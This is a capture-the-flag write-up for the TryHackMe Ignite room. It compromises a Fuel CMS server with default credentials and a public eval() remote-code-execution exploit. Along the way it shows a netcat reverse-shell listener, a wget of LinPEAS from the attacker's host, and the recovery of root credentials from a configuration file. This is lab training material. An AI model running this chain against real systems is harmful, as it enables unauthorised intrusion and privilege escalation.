# TryHackMe - Ignite Write-up

## Introduction

The objective of this room was to exploit a vulnerable instance of Fuel CMS and obtain root access to the machine.
This challenge focuses on web enumeration, exploiting known vulnerabilities, reverse shells, and privilege escalation through credential discovery.

---

# Reconnaissance

The first step was performing an Nmap scan to identify open ports and running services.

```bash
nmap 10.XXX.XXX.XX -sS -sV -sC
```

### Scan Results

The scan revealed an HTTP service running on port 80 and also exposed the presence of a `robots.txt` file.

<p align="center">
  <img width="785" height="256" alt="image" src="https://github.com/user-attachments/assets/85159950-1791-4709-afce-fe55501ece61" />

</p>

Since a web service was available, the next step was inspecting the website.

---

# Web Enumeration

Accessing the webpage displayed the default page of **Fuel CMS**, including the CMS version information.

<p align="center">
  <img width="1392" height="812" alt="image" src="https://github.com/user-attachments/assets/3916a002-8836-4bdd-a6b9-87214c66cdd2" />

</p>

The Nmap scan had already revealed the existence of a `robots.txt` file, so it was checked next.

Inside `robots.txt`, there was a disallowed path pointing to `/fuel`.

<p align="center">
  <img width="910" height="431" alt="image" src="https://github.com/user-attachments/assets/58c979ed-1b6d-432e-95fa-b8d004d7447c" />

</p>

Navigating to `/fuel` led to a login panel.

<p align="center">
  <img width="1305" height="507" alt="image" src="https://github.com/user-attachments/assets/c4ed07a3-ef22-4596-9a05-25e88bc8e23d" />

</p>

---

# Default Credentials

After researching Fuel CMS default credentials online, the default login credentials were found to be:

```bash
admin:admin
```
<p align="center">
<img width="730" height="280" alt="image" src="https://github.com/user-attachments/assets/cdb3ba04-66cd-4606-91d0-b26fd2e9e0fa" />
  
</p>


Using those credentials successfully granted access to the admin panel.

<p align="center">
  <img width="1917" height="549" alt="image" src="https://github.com/user-attachments/assets/62c1c39c-a67a-4785-8b42-5169f1c035d1" />

</p>

---

# Exploitation

Searching for public exploits affecting the installed Fuel CMS version revealed an exploit targeting **Fuel CMS 1.4**.

The vulnerability abuses improper input filtering passed into the PHP `eval()` function, allowing **Remote Code Execution (RCE)**.

<p align="center">
  <img width="1828" height="690" alt="image" src="https://github.com/user-attachments/assets/907df0da-ce68-4d81-bdcc-d3028834a982" />

</p>

The exploit was downloaded and executed.

<p align="center">
  <img width="740" height="244" alt="image" src="https://github.com/user-attachments/assets/34749672-25c0-47bb-ba84-5a05a7309da3" />

</p>

Successful exploitation provided command execution on the target machine.

---

# Reverse Shell

Although command execution was achieved, the shell was not interactive.
To obtain a fully interactive shell, a reverse shell was spawned.

First, a Netcat listener was started on the attacking machine:

```bash
nc -lvnp 4444
```

Then, the reverse shell payload was executed through the exploit cmd.

<p align="center">
  <img width="940" height="115" alt="image" src="https://github.com/user-attachments/assets/2bde6d2b-ef1c-4430-af54-aa37695b8cc8" />

</p>

After receiving the connection, the shell was upgraded using Python PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<p align="center">
  <img width="690" height="408" alt="image" src="https://github.com/user-attachments/assets/c1606a1c-a493-49a5-b74a-9575b01e1b72" />


</p>

This provided a stable interactive shell.

---

# User Flag

With shell access established, the system was enumerated looking for useful files and flags.

Inside the user directory, the first flag was located.

<p align="center">
  <img width="419" height="208" alt="image" src="https://github.com/user-attachments/assets/94016515-0838-4d74-a53f-d8596d540367" />

</p>

---

# Privilege Escalation

At this point, the objective became obtaining the `root.txt` flag.

LinPEAS was uploaded and executed for enumeration:

```bash
wget http://10.xxxxxxxx:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

However, no obvious privilege escalation vectors were identified.

Since automated enumeration did not provide useful results, manual inspection of configuration files began.

Eventually, a `database.php` file was discovered inside:

```bash
/fuel/application/config/database.php
```

<p align="center">
  <img width="669" height="374" alt="image" src="https://github.com/user-attachments/assets/a5b995f7-a736-4eaa-bd0d-aaa65734dc26" />

</p>

Inside the file, credentials for the root user were exposed.

<p align="center">
  <img width="451" height="329" alt="image" src="https://github.com/user-attachments/assets/08670e66-89ee-4605-8d02-97cb0d72a5e4" />

</p>

Using the recovered password, switching to the root account was possible:

```bash
su root
```

Root access was successfully obtained.

<p align="center">
  <img width="573" height="74" alt="image" src="https://github.com/user-attachments/assets/c38a617c-a54e-4beb-816c-2fc95edca7f5" />

</p>

---

# Root Flag

Finally, navigating to the root directory revealed the final flag.

<p align="center">
  <img width="329" height="109" alt="image" src="https://github.com/user-attachments/assets/4ba8353f-6799-4f97-ba37-3a83a52e36fe" />

</p>

---

# Conclusion

This room was a great introduction to:

* Web Enumeration
* Fuel CMS exploitation
* Remote Code Execution (RCE)
* Reverse Shells
* Shell Stabilization
* Linux Enumeration
* Credential Discovery
* Privilege Escalation

The machine demonstrates how dangerous default credentials and exposed configuration files can be in real-world environments.

---

# Tools Used

* Nmap
* Searchsploit
* Netcat
* Python
* LinPEAS
* Bash

---

# Skills Practiced

* Enumeration
* Web Exploitation
* Reverse Shell Handling
* Linux Privilege Escalation
* Manual Enumeration
* Credential Harvesting
